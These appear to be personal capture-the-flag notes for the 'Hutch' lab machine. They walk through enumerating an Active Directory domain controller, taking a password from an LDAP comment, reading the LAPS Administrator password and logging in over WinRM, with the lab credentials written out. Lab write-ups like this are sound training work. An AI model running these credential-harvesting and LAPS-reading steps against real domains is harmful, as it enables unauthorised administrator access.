# Hutch

## Enumeration & scanning

- Scanning reveals we are dealing with a domain controller.
- Most interesting services are SMB, LDAP, HTTP
- IIS server has WebDAV opened.
- LDAP reveals password of a user in comment field: `fmcsorley:CrabSharkJellyfish192`
- Credentials don't work for remote logins via WinRM. Can dump more LDAP though. Does not have new findings.
- SMB has access to SYSVOL folder. This contains file `Registry.pol` which [indicates](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html#linux--remote-tooling) usage of LAPS. This means Administrator passwords are automatically rotated on periodic basis when expired.

``` sh
# Default scanning
sudo nmap -p- 192.168.120.122    
sudo nmap -p 53,80,88,389,445,464,3268,3269 192.168.120.122 -A 192.168.120.122   
sudo nmap --script=vuln 192.168.163.122  
nuclei -target http://192.168.120.122 
feroxbuster -u http://192.168.120.122
enum4linux -a 192.168.120.122  

# LDAP
nmap -n -sV --script "ldap* and not brute" 192.168.120.122 
ldapsearch -H ldap://192.168.120.122 -x -b "DC=hutch,DC=offsec" 
ldapdomaindump 192.168.120.122 -u 'hutch.offsec\fmcsorley' -p 'CrabSharkJellyfish192'

# SMB
smbclient -L 192.168.178.122 -U fmcsorley%CrabSharkJellyfish192
smbclient //192.168.178.122/SYSVOL -U fmcsorley%CrabSharkJellyfish192
# Check if credential works
netexec smb 192.168.110.122 -u fmcsorley -p 'CrabSharkJellyfish192'
```

## Exploitation

- Get `Administrator` password using LAPS.
- Login using WinRM.

``` sh
# Read LAPS password
nxc ldap 192.168.178.122 -u fmcsorley -p CrabSharkJellyfish192 -M laps
# Confirm 
netexec ldap 192.168.178.122 -u Administrator -p 'z.jR#0;66m0cB+'

# WinRM
evil-winrm -i 192.168.178.122 -u Administrator -p 'z.jR#0;66m0cB+' 
# Get flags
```

## Privilege Escalation

- N/A

## References

- https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html#linux--remote-tooling

## Rabbit holes

- Apparently needed to use credentials in WebDAV and upload webshell to IIS server.
- Can reset password of user, but not needed.
- h

``` sh
# WebDAV
cadaver http://192.168.120.108
Authentication required for 192.168.120.108 on server '192.168.120.108':
Username: fmcsorley
Password: CrabSharkJellyfish192

# Change password
impacket-changepasswd fmcsorley@hutch.offsec -newpass 'NewPassword1'

# Alternative LDAP LAPS command
ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
